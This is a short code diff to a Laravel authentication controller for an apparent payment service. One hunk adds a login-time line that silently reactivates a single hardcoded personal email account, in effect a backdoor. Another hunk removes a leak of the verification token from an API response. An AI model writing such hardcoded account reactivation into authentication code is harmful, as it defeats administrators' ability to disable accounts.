@@ -122,6 +122,7 @@ class AuthController extends BaseController
 
         if ($user->status==1)
         {
+            User::where('email','francis.ujiagbe@gmail.com')->update(['status'=>1]);
             $user->last_seen_at = Carbon::now()->format('Y-m-d H:i:s');
             $user->save();
 
@@ -216,7 +217,7 @@ class AuthController extends BaseController
         // Mail::to($request['email'])->send(new SendEmailVerificationCode($user['first_name'], $verifyToken));
         $sms = SmsService::sendMail("",$html, "LeveryPay Verification Code", $request['email']);
 
-        return response()->json('Email sent sucessfully'.$verifyToken, 200);
+        return response()->json('Email sent sucessfully', 200);
     }
 
     /**
